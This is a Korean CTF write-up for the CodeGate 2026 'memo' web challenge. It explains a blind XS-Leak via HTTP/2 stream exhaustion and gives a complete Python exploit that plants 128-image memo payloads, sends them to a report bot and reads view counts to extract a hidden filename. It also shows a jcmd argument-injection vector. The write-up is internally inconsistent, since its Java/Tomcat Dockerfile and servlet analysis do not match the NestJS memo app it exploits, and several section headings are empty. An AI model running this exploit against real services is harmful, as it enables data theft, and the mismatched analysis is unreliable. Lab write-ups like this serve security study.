# CodeGate 2026 CTF WriteUp
## memo (WEB)
1. 핵심 취약점 분석 (Vulnerabilities)
공격 기법: Blind XS-Leak (HTTP/2 Stream Exhaustion)


2. 공격 원리 (Exploit Concept)


3. 핵식 공격기법 구성 ex) Blind Oracle 구성 (참/거짓 추측 근거)


### Dockerfile 핵심 부분 분석
  
```typescript

COPY --from=flagbuilder /tmp/readflag /readflag
RUN chmod 4111 /readflag

RUN echo "codegate2026{this_is_a_local_dummy_flag_for_test}" > /flag \
    && chown root:root /flag \
    && chmod 400 /flag

COPY --from=builder /build/target/ROOT.war webapps/ROOT.war
RUN mkdir -p webapps/ROOT && cd webapps/ROOT && jar xf ../ROOT.war && rm ../ROOT.war
RUN sed -i 's|pattern="%h %l %u %t &quot;%r&quot; %s %b"|pattern="%a %{yyyy-MM-dd HH:mm:ss}t \&quot;%m %U%q\&quot; %s %b \&quot;%{User-Agent}i\&quot;"|' conf/server.xml

RUN useradd -r -s /usr/sbin/nologin ctf \
    && chmod 1777 work temp logs webapps/ROOT/WEB-INF/views
}

```

<p align = "center"> 
코드1
</p>

해당 Dockerfile 내용의 핵심부분을 보면 /readflag 바이너리에 SUID가 걸려있는 것을 확인하였고, flag 파일은 root 권한으로만 읽을 수 있도록 설정되어 있는 것을 확인하였다.
즉 RCE를 이용해서 /readflag를 실행시켜 flag 값을 얻는 문제인 것을 파악했다.



### 각각의 Endpoint 수집

<img width="888" height="231" alt="image" src="https://github.com/user-attachments/assets/5d5177a0-3060-48b2-a6ea-961773ad7d70" />

해당 이미지를 확인하여 수집한 Endooint 코드에 접근하여 분석을 진행 할 것이다.
1. /api/status?pid=
2. /api/heap?pid=
3. /api/threads?pid=



### incrementViews() 함수 분석

```java

public class StatusServlet extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {

        if (InputValidator.hasUnsafeParams(req)) {
            resp.sendError(500);
            return;
        }

        String pid = req.getParameter("pid");
        if (pid == null || pid.isEmpty()) {
            resp.sendError(500);
            return;
        }

		// Command Excution Sink 이부분 집중
        String cmd = "jcmd " + pid + " VM.version";
        Process p = Runtime.getRuntime().exec(cmd);

        try {
            if (!p.waitFor(3, TimeUnit.SECONDS)) {
                p.destroyForcibly();
                resp.sendError(500);
                return;
            }
        } catch (InterruptedException e) {
            p.destroyForcibly();
            Thread.currentThread().interrupt();
            resp.sendError(500);
            return;
        }

        resp.setContentType("text/plain; charset=UTF-8");
        PrintWriter out = resp.getWriter();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                out.println(line);
            }
        }
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(p.getErrorStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                out.println(line);
            }
        }
    }
}


```

<p align = "center"> 
코드3
</p>

Command Excution Sink 주석 부분을 확인해보면 get 파리미터의 pid 부분을 가져와서 jcmd pid VM.version 이런 형태의 jcmd 프로그램의 명령어를 실행하는 것을 알 수 있다.
즉 Argument Injection임을 파악했다.

### Argument Injection 동작 분석

공격 벡터
```
?pid=1+help
```

<img width="1282" height="714" alt="image" src="https://github.com/user-attachments/assets/2d4276a8-5df5-473b-a3f0-4881f72b50f9" />

정상 요청과 공격 벡터를 적용한 반응이 서로 다르며 에러를이르키지 않는 정상 응답으로 나오는 것을 확인할 수 있다. 

## 최종 시나리오
본 취약점들을 연계하여 플래그(Flag)를 탈취하는 전체 공격 흐름은 다음과 같다.
[단계 1: False 상태 확인 (기준점 잡기)]

1. 128개의 존재하지 않는 가짜 이미지(miss_...png)를 요청하는 <img> 태그가 포함된 메모를 작성한다.
2. 메모의 Share 기능을 통해 외부 열람용 공유 키(URL)를 발급받는다.
3. 봇(Bot, 5000번 포트)의 /report API에 해당 URL을 전송하여 봇이 방문하도록 유도한다.
4. 봇의 브라우저가 128개의 가짜 이미지를 요청하지만, 서버의 Hanging 취약점으로 인해 HTTP/2 스트림 128개가 모두 점유된 채 무한 대기 상태에 빠진다.
5. 결과적으로 봇의 브라우저가 실행하려던 조회수 증가 API(POST /view)가 서버에 도달하지 못하여 조회수는 증가하지 않는다 (0).

[단계 2: True 상태 확인 및 플래그 유추]

1. 이번에는 127개의 가짜 이미지 요청과 함께, 단 1개의 타겟 이미지 요청을 섞어 메모를 작성한다.
2. 타겟 이미지 요청은 관리자 API의 부분 일치 취약점을 노려 /api/image/admin?filename=flag_{추측할글자} 형태로 구성한다.
3. 마찬가지로 메모를 공유하고 발급받은 URL을 봇에게 제출(Report)한다.
4. 봇이 해당 페이지에 접속하면 127개의 스트림은 막히지만, 타겟 이미지의 시작 글자가 실제 플래그와 일치할 경우 서버가 이미지를 반환하고 **스트림 1개를 정상적으로 종료(반환)**해 준다.
5. 비어있는 1개의 스트림 통로를 통해 대기 중이던 조회수 증가 API(POST /view)가 서버로 성공적으로 전송된다.
6. 조회수가 1 증가한 것을 확인하면, 입력한 시작 글자가 플래그의 올바른 일부임을 확신할 수 있다.
7. 모든 값을 알아내면 /api/image?filename=flag_{추측한글자} 로 접근하면 flag를 얻을 수 있다.




## 실행 및 결과

__Step 1.__ 생성한 계정으로 로그인 시도

<img width="1254" height="536" alt="image" src="https://github.com/user-attachments/assets/8fc077a6-eeab-4be7-b4a3-39862d86d8f3" />

<br>
__Step 2.__ 메모 생성 페이지 접근

<img width="1226" height="639" alt="image" src="https://github.com/user-attachments/assets/89fc3d7d-d85a-44a5-8a9b-62c977ae785b" />

<br>
__Step 3.__ 서버 내에 존재하지 않은 이미지 파일명 128개 요청 메모 작성
<img width="1230" height="561" alt="image" src="https://github.com/user-attachments/assets/f018435b-1f9a-41b0-84d8-f4db8f150d98" />


<br>

__Step 4.__ 작성한 메모에 접근
<img width="1241" height="624" alt="image" src="https://github.com/user-attachments/assets/688bfaab-3a2a-4f4b-a136-fd6d9f092bb7" />

<br>
__Step 5.__ 작성한 메모 공유
<img width="1253" height="445" alt="image" src="https://github.com/user-attachments/assets/ee89bc1c-9b2e-4e28-bb1d-500fe4d36a42" />


<br>
__Step 6.__ 발급된 공유 키 확인
<img width="993" height="457" alt="image" src="https://github.com/user-attachments/assets/79af6848-1511-4dd4-baa6-5b67c5c51be8" />


<br>
__Step 7.__ bot을 통한 공유 메모에 접근
<img width="830" height="353" alt="image" src="https://github.com/user-attachments/assets/221fbf22-edf5-4b7a-965c-c097ca5e4f1a" />


<br>
__Step 8.__ bot을 통해 접근 시 view가 변화 확인 (원래 값 2였음)
<img width="1176" height="613" alt="image" src="https://github.com/user-attachments/assets/f752d32e-47a3-4918-b4c9-034c4352438b" />

<br>
__Step 9.__ 새로운 메모 작성(127개 오류, 1개 정상 요청)
<img width="1226" height="542" alt="image" src="https://github.com/user-attachments/assets/2215d911-b7b7-4c04-9b86-1a573e0ce877" />


<br>
__Step 10.__ 공유 키 발급
<img width="1104" height="430" alt="image" src="https://github.com/user-attachments/assets/128bd87f-1d0b-4db9-8301-024369bc4797" />


<br>
__Step 11.__ bot을 통한 공유 메모 접근
<img width="835" height="312" alt="image" src="https://github.com/user-attachments/assets/4551b0de-5ade-48f9-abbd-eff1ab65f6c6" />

<br>
__Step 12.__ 요청 마다 view가 오르는 것을 확인 
<img width="1211" height="476" alt="image" src="https://github.com/user-attachments/assets/37cfa912-6b7c-4344-af02-8569c58d7b3e" />

## exploit Code
```
#[기본 세팅 (로그인)]
#[이진 탐색 루프 시작]
#[페이로드 생성]
#[메모 게시] 
#[공유 키 발급] 
#[봇 호출 및 대기] 
#[조회수 확인] 
#[참/거짓 판단 후 다음 글자 추측]
import requests
import random
import string
import urllib3 # 추가
import time

# 쓸데없는 SSL 경고 메시지(InsecureRequestWarning)가 화면을 덮는 것을 방지
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class MemoClient:
    def __init__(self, base_url:str):
        self.base_url = base_url
        #Session 객체: 로그인 후 발급되는 쿠키(세션)을 자동으로 기억해줌
        self.session = requests.Session()
        self.session.verify = False
        
    def _generate_random_id(self, length=8):
        # 매번 새로운 계정으로 가입을 하기 위한 랜덤 아이디 생성기
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    def register_and_login(self) -> bool:
        #랜덤 계정으로 회원가입 후 즉시 로그인 수행
        username = self._generate_random_id()
        password = "password123!"
        
        # 1. 회원가입 로직
        register_url = f"{self.base_url}/api/auth/register"
        print(f"[*] 랜덤 계정 생성 및 회원가입 시도: {username}")
        
        reg_res = self.session.post(register_url, json={"username":username, "password":password, "name":"x"})
        
        if reg_res.status_code not in [200,201]:
            print(f"[-] 회원가입 실패")
            return False
        
        # 2. 로그인 로직
        login_url = f"{self.base_url}/api/auth/login"
        print("[*] 로그인 시도 중...")
        
        login_res = self.session.post(login_url, json={"username":username, "password":password})
        
        if login_res.status_code == 200 or login_res.status_code == 201:
            print("[+] 로그인 성공 세션 저장")
            return True
        else:
            print(f"[-] 로그인 실패: {login_res.text}")
            return False
            
            
    def create_memo(self, title:str, content) -> str:
        #메모 작성 메모ID 반환
        url = f"{self.base_url}/api/memo"
        res = self.session.post(url, json = {"title":title, "content":content})
        
        # 서버 응답 json 구조에 맞게 파싱
        if res.status_code not in [200, 201]:
            print("[-] 메모 작성 실패")
            return None
        
        list_res = self.session.get(url)
        data_list = list_res.json().get("data",[])
        
        latest_memo = data_list[-1]
        memo_id = latest_memo.get("_id")
        return memo_id
        
    def share_memo(self, memo_id: str) -> str:
        # 메모를 공유상태로 만들고 sharedKey를 반환
        url = f"{self.base_url}/api/memo/{memo_id}/share"
        res = self.session.post(url)
        return res.json().get("data",{}).get("sharedKey")
        
    def get_view(self) -> int:
        # 메모 목록을 불러와 가장 최근 메모의 조회수 확인
        url = f"{self.base_url}/api/memo"
        res = self.session.get(url)
        
        # data 배열안에 메모들이 있다.
        data_list = res.json().get("data", [])# 해석 필요
        if not data_list:
            return 0
            
        latest_memo = data_list[0]
        #print(data_list)
        print(f"[*] latest_memo value: {latest_memo.get('views', 0)}")
        return latest_memo.get("views", 0)




class BotClient:
    def __init__(self, bot_url:str):
        self.bot_url = bot_url
        self.session = requests.Session()
        
    def report(self, target_url:str):
        #봇에게 악성 URL을 전달하여 방문을 유도
        print(f"[*] 봇에게 URL 신고중: {target_url}")
        res = self.session.post(f"{self.bot_url}/report", json={"url": target_url})
        
        if res.status_code == 200:
            print("[+] 봇이 정상적으로 URL 접수")
        else:
            print("[-] 봇 호출 실패!")


def build_payload(guess_str: str) -> str:
    """127개의 가짜 이미지와 1개의 타겟 이미지를 섞어 128개의 스트림을 꽉 채우는 페이로드 생성"""
    payload = ""
    # 127개의 함정 (무한 대기 유발)
    for i in range(127):
        payload += f"<img src='/api/image?filename=miss_{i}'>"
        
    # 1개의 진짜 타겟 (추측할 글자 포함)
    payload += f"<img src='/api/image/admin?filename={guess_str}'>"
    print("guess_str",guess_str)
    return payload


# 테스트
if __name__ == "__main__":
    TARGET_URL = "https://127.0.0.1"
    BOT_URL = "http://127.0.0.1:5000"
    
    memo_client = MemoClient(TARGET_URL)
    bot_client = BotClient(BOT_URL)
    
    print("===============================================")
    print(" Blind XS-Leak Exploit (Stream Exhaustion)")
    print("===============================================")
    
    
    
    # 우리가 찾아야 할 글자 후보군 (16진수 해시+ 혹시모를 하이픈)
    CHARSET = "0123456789abcdef-_"
    
    #현재까지 확정된 정답
    known_flag = "flag_"
    
    print(f"[*] 타겟 추출 시작! 기본 접두사: {known_flag}")
    
    #플래그를 모두 찾을 때까지 무한 반복(글자를 하나씩 이어 붙임)
    while True:
        found_next_char = False
        if not memo_client.register_and_login():
            print("[-] 로그인 실패하여 익스플로잇 종료")
            exit(1)
        for char in CHARSET:
            guess = known_flag + char
            print(f"[*] 테스트 중: [ {guess} ] ...", end="", flush=True)
            
            # 1. 페이로드 조립 및 메모 작성
            payload = build_payload(guess)
            memo_id = memo_client.create_memo(f"Leak {guess}",payload)
            
            # 2. 공유 키 발급
            shared_key = memo_client.share_memo(memo_id)
            print(memo_id, shared_key)
            # 3. 봇에게 신고
            bot_target_url = f"https://nginx/memo/shared?key={shared_key}"
            bot_client.report(bot_target_url)
            
            # 4. 봇이 줄을때까지 대기
            time.sleep(4)
            
            # 5. 참/거짓 판독(Oracle)
            views = memo_client.get_view()
            
            if views > 0:
                print(f"[+] 조회수 증가! 다음글자는  {char} 입니다!")
                known_flag += char
                found_next_char = True
                break
            else:
                print("[MISS]")
                
            # 한사이클(CHARSET) 다 돌았는데 일치하는 글자가 없다면 끝난것!
        if not found_next_char:
            print("더이상 일치하는 글자가 없습니다.")
            break
    print("==================================================")
    print(f"최종 획득한 타겟 파일명: {known_flag}")
    print("==================================================")
    print(f"[!] 이제 브라우저에서 https://127.0.0.1/api/image?filename={known_flag}.png 로 접속하세요!")
```


# 취약점 패치
## 취약한 코드 패치
```
// image.controller.ts
 @Get('/')
    async getImage(
        @Query('filename') filename: string,
        @Res() res: Response
    ): Promise<void> {
        if (!filename) throw new HttpException('filename is required.', 400);

        const imagePath = this.imageService.getImagePath(filename);
        if (!imagePath) {
    			res.status(404).json({ message:'file not found'}); // 파일이름 없을 시 404 반환
    			return;
    		}
        return res.sendFile(imagePath);
    }

    @Get('/admin')
    @UseGuards(AdminGuard)
    async getImageAdmin(
        @Query('filename') filename: string,
        @Req() req: Request,
        @Res() res: Response
    ): Promise<void> {
        const site = req.get('sec-fetch-site');

        if (site !== 'same-origin') throw new HttpException('Unauthorized.', 401);

        if (!filename) throw new HttpException('filename is required.', 400); 

        const imagePath = this.imageService.getAdminImagePath(filename);
        if (!imagePath) {
			    res.status(404).json({ message:'file not found'}); // 파일 이름 없을 시 404 반환
			    return;
		    }
        return res.sendFile(imagePath);
    }
```
